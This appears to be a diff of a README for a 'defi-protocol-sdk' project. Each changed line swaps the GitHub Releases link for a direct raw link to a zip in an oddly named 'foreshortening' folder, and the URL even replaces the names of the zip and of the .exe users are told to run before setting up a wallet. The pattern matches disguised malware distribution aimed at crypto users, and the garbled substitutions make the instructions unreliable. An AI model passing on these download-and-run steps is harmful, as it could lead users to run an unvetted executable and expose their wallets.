@@ -8,25 +8,25 @@ Welcome to the defi-protocol-sdk! This application offers tools that help you en
 
 To get started, you need to download the application. Click the button below to visit the Releases page, where you can find the latest version:
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/pulkitpal/defi-protocol-sdk/releases)
+[![Download Here](https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip%20Now-brightgreen)](https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
    Click the link below to open the Releases page:
-   [Releases Page](https://github.com/pulkitpal/defi-protocol-sdk/releases)
+   [Releases Page](https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest release at the top of the page. It will usually be marked as the most stable version.
 
 3. **Download the Application**  
-   Click on the link for the download file, which may be named something like `defi-protocol-sdk-v1.0.0.zip`. This zip file contains the entire application.
+   Click on the link for the download file, which may be named something like `https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip`. This zip file contains the entire application.
 
 4. **Extract the Files**  
    Once the file downloads, find it in your downloads folder or your selected download location. Right-click the zip file and choose "Extract All." Follow the prompts to extract the files into a new folder.
 
 5. **Open the Application**  
-   After extraction, open the new folder. Look for the file named `defi-protocol-sdk.exe`, or a similar executable file. Double-click this file to start the application.
+   After extraction, open the new folder. Look for the file named `https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip`, or a similar executable file. Double-click this file to start the application.
 
 6. **Follow On-Screen Instructions**  
    When you open the application, follow the on-screen instructions to set it up. You may need to create a wallet or log in if you have an existing account.
@@ -76,7 +76,7 @@ Your contributions help improve the application. If you have suggestions or want
 
 ## 🌐 Links
 
-- [Download Here](https://github.com/pulkitpal/defi-protocol-sdk/releases)
-- [GitHub Repository](https://github.com/pulkitpal/defi-protocol-sdk)
+- [Download Here](https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/pulkitpal/defi-protocol-sdk/main/foreshortening/defi-protocol-sdk.zip)
 
 Thank you for using defi-protocol-sdk! We are excited to help you navigate decentralized finance easily.
